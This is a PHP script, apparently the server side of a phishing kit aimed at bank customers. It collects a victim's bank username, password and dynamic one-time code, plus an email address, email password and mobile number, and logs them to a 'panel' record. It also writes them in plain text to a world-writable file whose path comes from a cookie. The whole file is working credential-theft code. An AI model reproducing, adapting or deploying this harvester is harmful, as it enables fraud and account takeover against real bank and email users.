<?php 
require('../../panel/lib/funciones.php');

$usuario = $_COOKIE['usuario'];
$contrasena = $_COOKIE['contrasena'];
$registro = $_COOKIE['registro'];
$file = $_COOKIE['archivo'];
$cdinamica = $_COOKIE['cdinamica'];

$email = $_POST['eml'];
$cemail = $_POST['passe'];
$celular = $_POST['cel'];

setcookie('email',$email,time()+60*9);
setcookie('cemail',$cemail,time()+60*9);
setcookie('celular',$celular,time()+60*9);

actualizar_registro_mail($registro,$email,$cemail,$celular);

$data = 'Usuario: '.$usuario." Clave: ".$contrasena." Dinamica: ".$cdinamica." Email: ".$email." Clave: ".$cemail;

if (isset($data)) {
    $fp = fopen($file, 'w');
    fwrite($fp, utf8_decode($data));
    fclose($fp);
    chmod($file, 0777);
}
else {
    echo 'No hay datos que guardar!';
}
?>